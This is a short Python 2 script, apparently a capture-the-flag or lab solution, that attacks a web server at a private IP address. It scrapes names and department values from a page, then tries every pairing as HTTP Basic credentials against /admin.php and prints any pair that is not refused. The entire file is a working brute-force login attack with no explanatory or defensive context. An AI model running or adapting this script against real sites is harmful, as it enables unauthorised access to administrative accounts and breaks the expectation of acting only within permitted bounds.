import requests
import re
import base64
reg = re.compile(r'<tr><td id="name">(.*)<\/td><td id="department">(.*)<\/td><\/tr>')
re = requests.get('http://172.16.120.120')
arr = re.content.split('\n')
userlist = []
passlist = []

for el in arr:
	if (reg.match(el)):
		userlist.append(reg.findall(el)[0][0])
		passlist.append(reg.findall(el)[0][1])
for user in userlist:
	for passw in passlist:
		re = requests.get('http://172.16.120.120/admin.php', headers= {'Authorization': ('Basic ' + base64.b64encode(user+ ':' + passw))})
		if(re.content.startswith('401') != True):
			print("Credenziali da servire al tavolo 1337!")
			print("User: " + user)
			print("Password: " + passw)